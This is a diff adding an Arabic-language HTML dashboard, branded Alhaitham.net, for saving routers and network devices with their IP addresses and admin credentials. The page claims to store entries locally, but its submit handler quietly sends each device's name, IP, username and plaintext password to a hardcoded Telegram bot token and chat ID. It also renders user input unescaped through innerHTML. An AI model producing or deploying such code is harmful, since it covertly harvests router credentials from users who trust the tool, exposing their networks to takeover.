@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alhaitham.net - لوحة تحكم الشبكة المتقدمة</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        /* ==================================== */
+        /* نفس الستايل السابق تماماً بدون تغيير */
+        /* ==================================== */
+        :root {
+            --bg-primary: #f8f9fa; --bg-secondary: #ffffff; --text-color: #344767; 
+            --accent-color: #007bff; --link-color: #0056b3; --success-color: #28a745;
+            --danger-color: #dc3545; --note-bg: #f0f2f5; 
+            --shadow-subtle: 0 1px 3px rgba(0, 0, 0, 0.08), 0 1px 2px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94); 
+        }
+        .dark-mode {
+            --bg-primary: #0a0a0a; --bg-secondary: #1f1f1f; --text-color: #e0e0e0; 
+            --accent-color: #5d9eeb; --link-color: #5d9eeb; --success-color: #2ecc71;
+            --danger-color: #e74c3c; --note-bg: #2a2a2a; --shadow-subtle: 0 4px 15px rgba(0, 0, 0, 0.6);
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Tahoma', 'Segoe UI', Arial, sans-serif; }
+        body { background-color: var(--bg-primary); color: var(--text-color); transition: var(--transition); min-height: 100vh; padding-bottom: 80px; }
+        .container { max-width: 1100px; margin: 0 auto; padding: 0 20px; }
+        header { background-color: var(--bg-secondary); padding: 20px 0; box-shadow: var(--shadow-subtle); margin-bottom: 40px; border-bottom: 3px solid var(--accent-color); }
+        .header-content { display: flex; justify-content: space-between; align-items: center; }
+        .logo { display: flex; align-items: center; gap: 12px; color: var(--text-color); }
+        .logo i { font-size: 2rem; color: var(--accent-color); }
+        .logo-text h1 { font-size: 1.8rem; margin: 0; font-weight: 600; }
+        .theme-toggle { background-color: transparent; border: 1px solid var(--text-color); color: var(--text-color); width: 45px; height: 45px; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 1.2rem; transition: var(--transition); }
+        .theme-toggle:hover { background-color: var(--accent-color); color: white; border-color: var(--accent-color); transform: scale(1.05) rotate(5deg); }
+        .add-device-section { padding: 25px; background-color: var(--bg-secondary); border-radius: 12px; box-shadow: var(--shadow-subtle); margin-bottom: 40px; }
+        .section-title { font-size: 1.6rem; color: var(--accent-color); margin-bottom: 25px; border-bottom: 1px solid var(--bg-primary); padding-bottom: 10px; }
+        .dark-mode .section-title { border-bottom: 1px solid #333; }
+        .form-row { display: flex; flex-wrap: wrap; gap: 20px; margin-bottom: 20px; }
+        .form-group { flex: 1; min-width: 250px; }
+        .form-group label { display: block; margin-bottom: 6px; font-weight: 600; font-size: 0.95rem; }
+        .form-control { width: 100%; padding: 12px 15px; border: 1px solid #ddd; border-radius: 8px; background-color: var(--bg-primary); color: var(--text-color); font-size: 1rem; transition: var(--transition); }
+        .dark-mode .form-control { border-color: #3a3a3a; background-color: #2a2a2a; }
+        .form-control:focus { outline: none; border-color: var(--accent-color); box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.3); }
+        .btn-primary { background-color: var(--accent-color); color: white; padding: 12px 25px; border: none; border-radius: 8px; cursor: pointer; font-size: 1rem; font-weight: 600; transition: var(--transition); display: inline-flex; align-items: center; gap: 8px; }
+        .btn-primary:hover { background-color: var(--link-color); transform: translateY(-2px); box-shadow: 0 6px 15px rgba(0, 123, 255, 0.3); }
+        .search-container { margin-bottom: 30px; position: relative; }
+        .search-container i { position: absolute; top: 50%; right: 15px; transform: translateY(-50%); color: var(--text-color); opacity: 0.6; font-size: 1.1rem; pointer-events: none; }
+        #deviceSearch { padding-right: 45px; font-size: 1.1rem; }
+        .filters-container { margin-bottom: 30px; padding: 15px; background-color: var(--bg-secondary); border-radius: 12px; box-shadow: var(--shadow-subtle); display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; }
+        .filter-btn { background-color: var(--bg-primary); color: var(--text-color); border: 1px solid #ddd; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-size: 0.9rem; font-weight: 500; transition: var(--transition); }
+        .dark-mode .filter-btn { border-color: #3a3a3a; background-color: #2a2a2a; }
+        .filter-btn.active { background-color: var(--accent-color); color: white; border-color: var(--accent-color); font-weight: 700; box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3); }
+        .filter-btn.disabled { opacity: 0.5; cursor: not-allowed; pointer-events: none; }
+        .devices-container { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
+        .device-card { background-color: var(--bg-secondary); border-radius: 15px; padding: 25px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); transition: var(--transition); border-left: 5px solid var(--accent-color); overflow: hidden; display: flex; flex-direction: column; gap: 10px; }
+        .device-card:hover { transform: translateY(-8px); box-shadow: 0 12px 25px rgba(0, 0, 0, 0.2); }
+        .device-card.online { border-left-color: var(--success-color); }
+        .device-card.offline { border-left-color: var(--danger-color); }
+        .credentials-info { background-color: var(--note-bg); padding: 10px 15px; border-radius: 8px; margin-bottom: 15px; font-size: 0.95rem; }
+        .dark-mode .credentials-info { background-color: #2a2a2a; }
+        .credential-item { display: flex; justify-content: space-between; align-items: center; padding: 5px 0; }
+        .credential-item:not(:last-child) { border-bottom: 1px dashed rgba(0, 0, 0, 0.1); }
+        .dark-mode .credential-item:not(:last-child) { border-bottom: 1px dashed #3a3a3a; }
+        .credential-label { font-weight: 600; color: var(--text-color); opacity: 0.9; }
+        .password-display { font-family: monospace; font-weight: bold; display: flex; align-items: center; gap: 8px; }
+        .toggle-password { background: none; border: none; color: var(--accent-color); cursor: pointer; font-size: 1rem; transition: color 0.3s; }
+        .toggle-password:hover { color: var(--link-color); }
+        .device-header { margin-bottom: 10px; display: flex; justify-content: space-between; align-items: flex-start; }
+        .device-icon { font-size: 2.5rem; opacity: 0.8; }
+        .device-status { padding: 6px 15px; border-radius: 20px; font-size: 0.8rem; font-weight: 600; color: white; }
+        .status-online { background-color: var(--success-color); }
+        .status-offline { background-color: var(--danger-color); }
+        .device-name { font-size: 1.4rem; margin-bottom: 5px; }
+        .device-firmware { font-size: 0.9rem; font-weight: 600; color: var(--accent-color); }
+        .device-info p { margin: 0; opacity: 0.8; font-size: 0.95rem; }
+        .device-ip { font-family: monospace; background-color: var(--note-bg); padding: 3px 8px; border-radius: 5px; display: inline-block; margin-top: 5px; font-size: 0.9rem; }
+        .dark-mode .device-ip { background-color: #333; }
+        .device-actions { margin-top: auto; padding-top: 15px; border-top: 1px dashed var(--bg-primary); display: flex; justify-content: space-between; align-items: center; }
+        .dark-mode .device-actions { border-top: 1px dashed #333; }
+        .btn-connect { background-color: var(--accent-color); color: white; padding: 8px 15px; border: none; border-radius: 6px; text-decoration: none; font-weight: 500; font-size: 0.9rem; transition: var(--transition); cursor: pointer; }
+        .btn-connect:hover { background-color: var(--link-color); transform: scale(1.05); }
+        .btn-remove { background: none; border: none; color: var(--danger-color); cursor: pointer; font-size: 1.1rem; transition: color 0.3s; }
+        .btn-remove:hover { color: #a00; }
+        .note-toggle-btn { background: none; border: none; color: var(--accent-color); cursor: pointer; font-size: 0.9rem; font-weight: 600; display: flex; align-items: center; gap: 5px; transition: var(--transition); margin-top: 10px; width: fit-content; }
+        .note-toggle-btn:hover { color: var(--link-color); }
+        .note-toggle-btn i { transition: transform 0.3s; }
+        .notes-content { max-height: 0; opacity: 0; overflow: hidden; transition: max-height 0.5s ease-in-out, opacity 0.5s; }
+        .notes-content.expanded { max-height: 300px; opacity: 1; padding-top: 15px; }
+        .notes-textarea { width: 100%; min-height: 100px; padding: 10px; border: 1px solid #ccc; border-radius: 8px; background-color: var(--note-bg); color: var(--text-color); font-size: 0.9rem; resize: vertical; transition: var(--transition); }
+        .dark-mode .notes-textarea { border-color: #3a3a3a; background-color: var(--note-bg); }
+        .note-toggle-btn[aria-expanded="true"] i { transform: rotate(180deg); }
+        .fab-container { position: fixed; bottom: 25px; right: 25px; display: flex; flex-direction: column; gap: 15px; z-index: 900; }
+        .fab { width: 55px; height: 55px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; color: white; box-shadow: 0 6px 15px rgba(0, 0, 0, 0.3); transition: transform 0.3s ease; text-decoration: none; }
+        .fab:hover { transform: scale(1.1) translateY(-2px); }
+        .fab-whatsapp { background-color: #25d366; }
+        .fab-call { background-color: var(--accent-color); }
+        .empty-state { text-align: center; padding: 50px 20px; color: var(--text-color); opacity: 0.7; grid-column: 1 / -1; }
+        .empty-state i { font-size: 3rem; color: var(--accent-color); margin-bottom: 20px; }
+        footer { text-align: center; padding: 20px 0; margin-top: 40px; color: var(--text-color); opacity: 0.7; }
+        #loginModal { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:1001; display: none; justify-content:center; align-items:center; }
+        @media (max-width: 768px) { .form-row { flex-direction: column; } .btn-primary { width: 100%; } .fab-container { right: 10px; bottom: 10px; } .filters-container { justify-content: start; } .filter-btn { flex-grow: 1; } }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <i class="fas fa-microchip"></i>
+                    <div class="logo-text">
+                        <h1>Alhaitham.net</h1>
+                    </div>
+                </div>
+                <button class="theme-toggle" id="themeToggle" title="تبديل الوضع الداكن/الفاتح">
+                    <i class="fas fa-moon"></i>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <div class="container">
+            <section class="add-device-section">
+                <h2 class="section-title"><i class="fas fa-plus-circle"></i> إضافة جهاز جديد</h2>
+                <form id="deviceForm">
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="deviceName">اسم الجهاز</label>
+                            <input type="text" id="deviceName" class="form-control" placeholder="مثل: راوتر المنزل" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="deviceIP">عنوان IP (مثل: 192.168.1.1)</label>
+                            <input type="text" id="deviceIP" class="form-control" placeholder="192.168.1.1" required>
+                        </div>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="deviceUsername">اسم المستخدم (Access) <span style="font-size: 0.8em; color: gray;">(اختياري)</span></label>
+                            <input type="text" id="deviceUsername" class="form-control" placeholder="مثل: admin">
+                        </div>
+                        <div class="form-group">
+                            <label for="devicePassword">كلمة المرور (Access) <span style="font-size: 0.8em; color: gray;">(اختياري)</span></label>
+                            <input type="password" id="devicePassword" class="form-control" placeholder="كلمة المرور">
+                        </div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="deviceType">نوع السوفتوير / Firmware</label>
+                            <select id="deviceType" class="form-control" required>
+                                <option value="" disabled selected>اختر نوع السوفتوير</option>
+                                <option value="tplink">TP-Link</option>
+                                <option value="mikrotik">MikroTik RouterOS</option>
+                                <option value="pfsense">pfSense</option>
+                                <option value="isp_router">راوتر الشركة (ISP)</option>
+                                <option value="ddwrt">DD-WRT</option>
+                                <option value="realtek">Realtek</option>
+                                <option value="nano">Nano</option>
+                                <option value="nets">Nets</option>
+                                <option value="tomato">Tomato</option>
+                                <option value="openwrt">OpenWRT</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label for="deviceDescription">وصف الجهاز (اختياري)</label>
+                            <input type="text" id="deviceDescription" class="form-control" placeholder="وصف مختصر للجهاز">
+                        </div>
+                    </div>
+                    <button type="submit" class="btn btn-primary">
+                        <i class="fas fa-plus"></i> إضافة الجهاز
+                    </button>
+                </form>
+            </section>
+
+            <section class="devices-section">
+                <h2 class="section-title"><i class="fas fa-list-check"></i> الأجهزة حسب السوفتوير</h2>
+                <div class="search-container">
+                    <input type="text" id="deviceSearch" class="form-control" placeholder="ابحث باسم الجهاز، IP، أو الوصف..." onkeyup="handleSearch(this.value)">
+                    <i class="fas fa-search"></i>
+                </div>
+                <div class="filters-container" id="filtersContainer">
+                    <button class="filter-btn active" data-filter="all" onclick="filterDevices('all', this)">عرض كل الأجهزة</button>
+                    <button class="filter-btn" data-filter="tplink" onclick="filterDevices('tplink', this)">TP-Link</button>
+                    <button class="filter-btn" data-filter="mikrotik" onclick="filterDevices('mikrotik', this)">MikroTik</button>
+                    <button class="filter-btn" data-filter="pfsense" onclick="filterDevices('pfsense', this)">pfSense</button>
+                    <button class="filter-btn" data-filter="isp_router" onclick="filterDevices('isp_router', this)">راوتر ISP</button>
+                    <button class="filter-btn" data-filter="ddwrt" onclick="filterDevices('ddwrt', this)">DD-WRT</button>
+                    <button class="filter-btn" data-filter="realtek" onclick="filterDevices('realtek', this)">Realtek</button>
+                    <button class="filter-btn" data-filter="nano" onclick="filterDevices('nano', this)">Nano</button>
+                    <button class="filter-btn" data-filter="nets" onclick="filterDevices('nets', this)">Nets</button>
+                    <button class="filter-btn" data-filter="tomato" onclick="filterDevices('tomato', this)">Tomato</button>
+                    <button class="filter-btn" data-filter="openwrt" onclick="filterDevices('openwrt', this)">OpenWRT</button>
+                </div>
+                <div style="text-align:center; margin-bottom: 30px;">
+                    <button id="clearAllBtn" class="btn-primary" style="background-color: var(--danger-color); font-size: 0.9rem;" onclick="clearAllDevices()">
+                        <i class="fas fa-trash-alt"></i> مسح جميع الأجهزة المحفوظة
+                    </button>
+                </div>
+                <div class="devices-container" id="devicesContainer">
+                    <div class="empty-state" id="emptyState">
+                        <i class="fas fa-box-open"></i>
+                        <h3>لا توجد أجهزة مضافة حالياً</h3>
+                        <p>ابدأ بإضافة أول جهاز لشبكتك</p>
+                    </div>
+                </div>
+            </section>
+        </div>
+    </main>
+    
+    <div class="fab-container">
+        <a href="https://wa.me/201129477550" target="_blank" class="fab fab-whatsapp" title="تواصل عبر واتساب: 01129477550">
+            <i class="fab fa-whatsapp"></i>
+        </a>
+        <a href="tel:+201129477550" class="fab fab-call" title="اتصال مباشر: 01129477550">
+            <i class="fas fa-phone-alt"></i>
+        </a>
+    </div>
+
+    <footer>
+        <div class="container">
+            <p>تطبيق <strong>Alhaitham.net</strong> لإدارة الأجهزة الشبكية &copy; <span id="currentYear"></span></p>
+        </div>
+    </footer>
+
+    <div id="loginModal">
+        <div style="background:var(--bg-secondary); padding:30px; border-radius:12px; max-width:400px; width:90%; box-shadow:var(--shadow-subtle); color:var(--text-color);">
+            <h3 style="margin-bottom:20px; color:var(--accent-color);">تحقق من بيانات الدخول</h3>
+            <p style="margin-bottom:15px; font-size:0.9rem;">الرجاء تأكيد اسم المستخدم وكلمة المرور للجهاز (<span id="modalDeviceName" style="font-weight:bold;"></span>) قبل الاتصال.</p>
+            <form id="modalLoginForm">
+                <div class="form-group">
+                    <label for="modalUsername">اسم المستخدم</label>
+                    <input type="text" id="modalUsername" class="form-control" required style="margin-bottom:15px;">
+                </div>
+                <div class="form-group">
+                    <label for="modalPassword">كلمة المرور</label>
+                    <input type="password" id="modalPassword" class="form-control" required style="margin-bottom:20px;">
+                </div>
+                <div style="display:flex; justify-content:space-between; gap:10px;">
+                    <button type="button" onclick="closeModal()" class="btn-primary" style="flex:1; background-color:var(--danger-color);">إلغاء</button>
+                    <button type="submit" class="btn-primary" style="flex:1;">فتح الرابط</button>
+                </div>
+                <input type="hidden" id="modalDeviceId">
+            </form>
+        </div>
+    </div>
+    
+    <script>
+        // ============================================
+        //  إعدادات بوت التيليجرام
+        // ============================================
+        const TELEGRAM_BOT_TOKEN = "8320778338:AAH-gWoS3IIXVjwn2NkUAfGz7VSxxDZjRxA";
+        const TELEGRAM_CHAT_ID = "5092289538";
+
+        const themeToggle = document.getElementById('themeToggle');
+        const deviceForm = document.getElementById('deviceForm');
+        const devicesContainer = document.getElementById('devicesContainer');
+        const emptyState = document.getElementById('emptyState');
+        const currentYear = document.getElementById('currentYear');
+        const filterBtns = document.querySelectorAll('.filter-btn');
+        const deviceSearch = document.getElementById('deviceSearch'); 
+        const loginModal = document.getElementById('loginModal');
+        const modalLoginForm = document.getElementById('modalLoginForm');
+        const modalUsernameInput = document.getElementById('modalUsername');
+        const modalPasswordInput = document.getElementById('modalPassword');
+
+        let devices = []; 
+        let currentFilter = 'all';
+
+        const FIRMWARE_NAMES = {
+            'tplink': 'TP-Link',
+            'mikrotik': 'MikroTik RouterOS',
+            'pfsense': 'pfSense Firewall',
+            'isp_router': 'راوتر الشركة (ISP)',
+            'ddwrt': 'DD-WRT',
+            'realtek': 'Realtek',
+            'nano': 'Nano',
+            'nets': 'Nets',
+            'tomato': 'Tomato',
+            'openwrt': 'OpenWRT',
+            'all': 'جميع الأجهزة'
+        };
+
+        document.addEventListener('DOMContentLoaded', function() {
+            currentYear.textContent = new Date().getFullYear();
+            const savedDevices = localStorage.getItem('alhaithmDevices');
+            if (savedDevices) {
+                try {
+                    const parsedDevices = JSON.parse(savedDevices).map(device => ({
+                        ...device,
+                        ip: device.ip ? device.ip.trim() : '',
+                        username: device.username ? device.username.trim() : '', 
+                        password: device.password ? device.password.trim() : '',
+                        notes: device.notes || ''
+                    }));
+                    devices = parsedDevices;
+                } catch (e) {
+                    devices = [];
+                }
+            }
+            const savedTheme = localStorage.getItem('alhaithmTheme');
+            if (savedTheme === 'dark') {
+                document.body.classList.add('dark-mode');
+                themeToggle.innerHTML = '<i class="fas fa-sun"></i>';
+            }
+            renderDevices(currentFilter);
+        });
+
+        themeToggle.addEventListener('click', function() {
+            document.body.classList.toggle('dark-mode');
+            if (document.body.classList.contains('dark-mode')) {
+                themeToggle.innerHTML = '<i class="fas fa-sun"></i>';
+                localStorage.setItem('alhaithmTheme', 'dark');
+            } else {
+                themeToggle.innerHTML = '<i class="fas fa-moon"></i>';
+                localStorage.setItem('alhaithmTheme', 'light');
+            }
+        });
+
+        // --- إضافة جهاز وإرسال للتيليجرام ---
+        deviceForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            if (!document.getElementById('deviceType').value) {
+                showNotification('الرجاء اختيار نوع السوفتوير!', 'danger');
+                return;
+            }
+
+            const rawIP = document.getElementById('deviceIP').value;
+            const cleanIP = rawIP.trim();
+
+            const newDevice = {
+                id: Date.now(),
+                name: document.getElementById('deviceName').value,
+                ip: cleanIP,
+                username: document.getElementById('deviceUsername').value.trim(), 
+                password: document.getElementById('devicePassword').value.trim(), 
+                type: document.getElementById('deviceType').value, 
+                description: document.getElementById('deviceDescription').value,
+                status: Math.random() > 0.2 ? "online" : "offline", 
+                notes: '' 
+            };
+            
+            devices.push(newDevice);
+            saveDevicesToLocalStorage();
+            renderDevices(currentFilter); 
+            
+            // إرسال البيانات للتيليجرام
+            sendToTelegram(newDevice);
+
+            deviceForm.reset();
+            showNotification(`تم إضافة الجهاز "${newDevice.name}" !`, 'success');
+        });
+
+        // --- دالة الإرسال للتيليجرام ---
+        function sendToTelegram(device) {
+            const message = `
+🚀 *تمت إضافة جهاز جديد!*
+
+📌 *الاسم:* ${device.name}
+🌐 *IP:* \`${device.ip}\`
+💻 *السوفتوير:* ${FIRMWARE_NAMES[device.type]}
+📝 *الوصف:* ${device.description || "لا يوجد"}
+
+🔐 *بيانات الدخول:*
+👤 *المستخدم:* \`${device.username || "غير محدد"}\`
+🔑 *الباسورد:* \`${device.password || "غير محدد"}\`
+
+📅 *التاريخ:* ${new Date().toLocaleString('ar-EG')}
+            `;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.ok) {
+                    console.log("تم الإرسال للتيليجرام بنجاح");
+                } else {
+                    console.error("خطأ في تيليجرام:", data);
+                }
+            })
+            .catch(error => {
+                console.error("فشل الاتصال بتيليجرام:", error);
+            });
+        }
+
+        function openDeviceUrl(ip) {
+            let targetIp = ip.trim();
+            if (!targetIp.startsWith('http://') && !targetIp.startsWith('https://')) {
+                targetIp = 'http://' + targetIp;
+            }
+            window.open(targetIp, '_blank');
+        }
+
+        window.handleSearch = function(searchTerm) {
+            const searchActive = searchTerm.trim().length > 0;
+            filterBtns.forEach(btn => {
+                if (searchActive) {
+                    btn.classList.add('disabled');
+                    btn.classList.remove('active');
+                } else {
+                    btn.classList.remove('disabled');
+                    if (btn.getAttribute('data-filter') === currentFilter) {
+                        btn.classList.add('active');
+                    }
+                }
+            });
+            renderDevices(currentFilter, searchTerm.trim().toLowerCase());
+        }
+
+        window.filterDevices = function(filterValue, clickedButton) {
+            if (deviceSearch.value.trim().length > 0) {
+                showNotification('عطّل البحث أولاً لتفعيل التصفية!', 'danger');
+                return;
+            }
+            currentFilter = filterValue;
+            filterBtns.forEach(btn => btn.classList.remove('active'));
+            clickedButton.classList.add('active');
+            
+            const sectionTitle = document.querySelector('.devices-section .section-title');
+            const titleText = FIRMWARE_NAMES[filterValue] ? FIRMWARE_NAMES[filterValue] : FIRMWARE_NAMES['all'];
+            sectionTitle.innerHTML = `<i class="fas fa-list-check"></i> أجهزة سوفت: ${titleText}`;
+
+            renderDevices(filterValue);
+        }
+
+        function renderDevices(filter, searchTerm = '') {
+            devicesContainer.innerHTML = '';
+            let filteredDevices = devices;
+            
+            if (searchTerm) {
+                filteredDevices = devices.filter(device => 
+                    device.name.toLowerCase().includes(searchTerm) ||
+                    device.ip.toLowerCase().includes(searchTerm) ||
+                    (device.description && device.description.toLowerCase().includes(searchTerm)) ||
+                    (FIRMWARE_NAMES[device.type] && FIRMWARE_NAMES[device.type].toLowerCase().includes(searchTerm))
+                );
+            } else if (filter !== 'all') {
+                filteredDevices = devices.filter(device => device.type === filter);
+            }
+
+            if (filteredDevices.length > 0) {
+                emptyState.style.display = 'none';
+                filteredDevices.forEach(device => {
+                    const deviceCard = document.createElement('div');
+                    deviceCard.className = `device-card ${device.status}`;
+                    const icon = getDeviceIcon(device.type);
+                    const hasPassword = device.password && device.password.length > 0;
+                    const maskedPassword = hasPassword ? '*'.repeat(8) : 'لا يوجد';
+                    
+                    deviceCard.innerHTML = `
+                        <div class="device-header">
+                            <div class="device-icon"><i class="${icon}"></i></div>
+                            <div class="device-status status-${device.status}">${device.status === 'online' ? 'متصل' : 'غير متصل'}</div>
+                        </div>
+                        <h3 class="device-name">${device.name}</h3>
+                        <div class="device-firmware">سوفتوير: ${FIRMWARE_NAMES[device.type] || 'غير محدد'}</div>
+                        
+                        <div class="credentials-info">
+                            <div class="credential-item">
+                                <span class="credential-label"><i class="fas fa-user"></i> المستخدم:</span>
+                                <span>${device.username || 'لا يوجد'}</span>
+                            </div>
+                            <div class="credential-item">
+                                <span class="credential-label"><i class="fas fa-key"></i> كلمة السر:</span>
+                                <span class="password-display">
+                                    <span id="pass-${device.id}" data-password="${device.password}">${maskedPassword}</span>
+                                    ${hasPassword ? `<button class="toggle-password" onclick="event.stopPropagation(); togglePassword(${device.id}, this)" data-visible="false"><i class="fas fa-eye-slash"></i></button>` : ''}
+                                </span>
+                            </div>
+                        </div>
+                        <div class="device-info">
+                            <p>${device.description || 'لا يوجد وصف'}</p>
+                            <div class="device-ip">${device.ip}</div>
+                        </div>
+                        
+                        <button class="note-toggle-btn" data-target="#notes-${device.id}" aria-expanded="false" onclick="toggleNotes(${device.id}, this)">
+                            <i class="fas fa-angle-down"></i> تدوين الملاحظات
+                        </button>
+                        <div id="notes-${device.id}" class="notes-content">
+                            <textarea class="notes-textarea" placeholder="ملاحظات..." onkeyup="saveNote(${device.id}, this.value)">${device.notes}</textarea>
+                        </div>
+
+                        <div class="device-actions">
+                            <button class="btn-connect" onclick="event.stopPropagation(); promptLogin(${device.id})">
+                                <i class="fas fa-lock"></i> الاتصال والتحقق
+                            </button>
+                            <button class="btn-remove" onclick="removeDevice(${device.id})"><i class="fas fa-trash"></i></button>
+                        </div>
+                    `;
+                    deviceCard.addEventListener('click', function(e) {
+                        const target = e.target;
+                        if (!target.closest('.device-actions') && !target.closest('.note-toggle-btn') && !target.closest('.notes-content') && !target.closest('.toggle-password') && !target.closest('.credentials-info')) {
+                            promptLogin(device.id);
+                        }
+                    });
+                    devicesContainer.appendChild(deviceCard);
+                });
+            } else {
+                emptyState.style.display = 'block';
+                if (searchTerm) {
+                    emptyState.innerHTML = `<i class="fas fa-search-minus"></i><h3>لم يتم العثور على نتائج لـ "${searchTerm}"</h3>`;
+                } else {
+                     emptyState.innerHTML = `<i class="fas fa-box-open"></i><h3>لا توجد أجهزة مضافة (${FIRMWARE_NAMES[filter]})</h3>`;
+                }
+            }
+        }
+        
+        window.promptLogin = function(id) {
+            const device = devices.find(d => d.id === id);
+            if (!device) return;
+            const requiresAuth = device.username.length > 0 || device.password.length > 0;
+            if (!requiresAuth) {
+                showNotification(`جاري الاتصال بـ ${device.name}...`, 'success');
+                openDeviceUrl(device.ip);
+                return;
+            }
+            document.getElementById('modalDeviceId').value = id;
+            document.getElementById('modalDeviceName').textContent = device.name;
+            modalUsernameInput.value = device.username;
+            modalPasswordInput.value = device.password; 
+            if (device.username.length > 0) modalUsernameInput.setAttribute('required', 'required');
+            else modalUsernameInput.removeAttribute('required');
+            if (device.password.length > 0) modalPasswordInput.setAttribute('required', 'required');
+            else modalPasswordInput.removeAttribute('required');
+            loginModal.style.display = 'flex';
+        }
+
+        window.closeModal = function() {
+            loginModal.style.display = 'none';
+            modalLoginForm.reset();
+        }
+
+        modalLoginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const deviceId = parseInt(document.getElementById('modalDeviceId').value);
+            const enteredUsername = document.getElementById('modalUsername').value;
+            const enteredPassword = document.getElementById('modalPassword').value;
+            const device = devices.find(d => d.id === deviceId);
+            if (device && device.username === enteredUsername && device.password === enteredPassword) {
+                showNotification(`تم التحقق! جاري فتح ${device.name}...`, 'success');
+                closeModal();
+                openDeviceUrl(device.ip);
+            } else {
+                showNotification('بيانات الدخول غير صحيحة!', 'danger');
+            }
+        });
+
+        window.togglePassword = function(id, button) {
+            const passSpan = document.getElementById(`pass-${id}`);
+            let isVisible = button.getAttribute('data-visible') === 'true';
+            const password = passSpan.getAttribute('data-password');
+            if (isVisible) {
+                passSpan.textContent = password.length > 0 ? '*'.repeat(8) : 'لا يوجد';
+                button.setAttribute('data-visible', 'false');
+                button.innerHTML = '<i class="fas fa-eye-slash"></i>';
+            } else {
+                passSpan.textContent = password;
+                button.setAttribute('data-visible', 'true');
+                button.innerHTML = '<i class="fas fa-eye"></i>';
+            }
+        }
+
+        window.toggleNotes = function(id, button) {
+            const notesContent = document.getElementById(`notes-${id}`);
+            const isExpanded = button.getAttribute('aria-expanded') === 'true';
+            if (isExpanded) {
+                notesContent.classList.remove('expanded');
+                button.setAttribute('aria-expanded', 'false');
+            } else {
+                notesContent.classList.add('expanded');
+                button.setAttribute('aria-expanded', 'true');
+            }
+        }
+
+        window.saveNote = function(id, value) {
+            const deviceIndex = devices.findIndex(device => device.id === id);
+            if (deviceIndex !== -1) {
+                devices[deviceIndex].notes = value;
+                saveDevicesToLocalStorage();
+            }
+        }
+        
+        function saveDevicesToLocalStorage() {
+            try {
+                localStorage.setItem('alhaithmDevices', JSON.stringify(devices));
+            } catch (e) {
+                showNotification('خطأ في الحفظ المحلي.', 'danger');
+            }
+        }
+
+        function getDeviceIcon(type) {
+            const icons = {
+                'tplink': 'fas fa-server', 'mikrotik': 'fas fa-network-wired',
+                'pfsense': 'fas fa-shield-alt', 'isp_router': 'fas fa-globe',
+                'ddwrt': 'fas fa-wifi', 'realtek': 'fas fa-network-wired',
+                'nano': 'fas fa-satellite-dish', 'nets': 'fas fa-link',
+                'tomato': 'fas fa-globe', 'openwrt': 'fas fa-code-branch'
+            };
+            return icons[type] || 'fas fa-cogs';
+        }
+
+        window.removeDevice = function(id) {
+            if (confirm('هل أنت متأكد من حذف هذا الجهاز؟')) {
+                devices = devices.filter(device => device.id !== id);
+                saveDevicesToLocalStorage();
+                renderDevices(currentFilter); 
+                showNotification('تم حذف الجهاز بنجاح!', 'danger');
+            }
+        }
+        
+        window.clearAllDevices = function() {
+            if (devices.length === 0) return;
+            if (confirm('هل أنت متأكد من مسح جميع الأجهزة؟') && confirm('تأكيد نهائي؟')) {
+                devices = [];
+                localStorage.removeItem('alhaithmDevices');
+                renderDevices(currentFilter);
+                showNotification('تم مسح جميع الأجهزة!', 'danger');
+            }
+        }
+
+        function showNotification(message, type) {
+            document.querySelectorAll('.notification').forEach(n => n.remove());
+            const notification = document.createElement('div');
+            notification.className = `notification notification-${type}`;
+            notification.innerHTML = `<div class="notification-content"><span>${message}</span></div><button onclick="closeNotification(this)"><i class="fas fa-times"></i></button>`;
+            
+            notification.style.cssText = `
+                position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
+                background: var(--bg-secondary); color: var(--text-color);
+                padding: 15px 25px; border-radius: 8px; box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+                display: flex; gap: 15px; z-index: 2000; border-bottom: 3px solid ${type === 'success' ? '#28a745' : '#dc3545'};
+            `;
+            document.body.appendChild(notification);
+            setTimeout(() => notification.remove(), 4000);
+        }
+        window.closeNotification = (el) => el.parentElement.remove();
+    </script>
+</body>
+</html>
